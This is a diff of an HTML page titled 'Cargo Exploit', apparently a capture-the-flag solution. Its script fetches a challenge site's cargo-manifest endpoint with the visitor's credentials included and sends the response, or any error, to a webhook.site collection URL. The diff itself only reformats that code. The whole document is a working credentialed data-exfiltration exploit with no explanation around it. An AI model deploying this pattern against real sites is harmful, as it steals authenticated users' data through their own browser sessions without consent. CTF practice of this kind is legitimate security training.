@@ -1,19 +1,22 @@
 <!DOCTYPE html>
 <html>
-<head><meta charset="utf-8"></head>
+<head>
+    <meta charset="utf-8">
+    <title>Cargo Exploit</title>
+</head>
 <body>
 <script>
-fetch("https://digitaltrustctf2026-ep21-trusted-origin.chals.io/api/episode21/cargo-manifest", {
-  method: "GET",
-  credentials: "include"
-})
-.then(r => r.text())
-.then(data => {
-  fetch("https://webhook.site/2633784c-c9d9-4e38-855d-ca6b4a7027ec?data=" + encodeURIComponent(data));
-})
-.catch(e => {
-  fetch("https://webhook.site/2633784c-c9d9-4e38-855d-ca6b4a7027ec?err=" + encodeURIComponent(String(e)));
-});
+    fetch("https://digitaltrustctf2026-ep21-trusted-origin.chals.io/api/episode21/cargo-manifest", {
+      method: "GET",
+      credentials: "include"
+    })
+    .then(r => r.text())
+    .then(data => {
+      fetch("https://webhook.site/2633784c-c9d9-4e38-855d-ca6b4a7027ec?data=" + encodeURIComponent(data));
+    })
+    .catch(e => {
+      fetch("https://webhook.site/2633784c-c9d9-4e38-855d-ca6b4a7027ec?err=" + encodeURIComponent(String(e)));
+    });
 </script>
 </body>
 </html>
